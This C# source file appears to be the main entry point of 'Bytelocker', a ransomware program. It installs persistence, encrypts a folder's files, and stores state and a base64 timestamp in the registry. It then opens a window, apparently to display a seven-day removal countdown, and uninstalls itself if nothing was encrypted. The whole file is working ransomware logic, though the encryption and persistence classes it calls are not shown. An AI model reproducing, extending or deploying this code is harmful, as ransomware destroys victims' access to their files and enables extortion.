﻿using Bytelocker.CryptoManager;
using Bytelocker.Installer;
using Bytelocker.Settings;
using Bytelocker.Tools;
using Bytelocker.UI;
using System;
using System.Windows.Forms;

namespace Bytelocker
{
    class Bytelocker
    {
        private static RegistryManager rm = new RegistryManager();

        // max hours should be 99 days
        public static int TIME_TILL_REMOVAL_HOURS = 168;

        public static void Main(String[] args)
        {
            Install();

            Encrypt();

            // if no files have been encrypted, uninstall
            if (rm.ReadAllValues(RegistryManager.FILES_KEY_NAME)[0] == "null")
            {
                Uninstall();
            }
            else
            {
                LaunchWindow();
            }

        }

        private static void Encrypt()
        {
            if (!(rm.ReadBoolValue(RegistryManager.SETTINGS_KEY_NAME, "UIShown")))
            {
                CryptoManagerMainHandler cmh = new CryptoManagerMainHandler();
                cmh.EncryptFolder(@"");
            }
        }

        public static void Decrypt()
        {
            CryptoManagerMainHandler cmh = new CryptoManagerMainHandler();
            cmh.DecryptAll();
        }

        public static void Uninstall()
        {
            new Uninstall();
        }

        private static void Install()
        {
            new Persistence();
        }


        [STAThread]
        private static void LaunchWindow()
        {
            rm.CreateBoolValue(RegistryManager.SETTINGS_KEY_NAME, "UIShown", true);

            if (rm.ReadStringValue(RegistryManager.SETTINGS_KEY_NAME, "t") == "none")
            {
                rm.CreateStringValue(RegistryManager.SETTINGS_KEY_NAME, "t", B64Manager.ToBase64(DateTime.Now.ToString()));
            }

            MainWindow mw = new MainWindow();
            Application.EnableVisualStyles();
            Application.Run(mw);
        }

    }
}
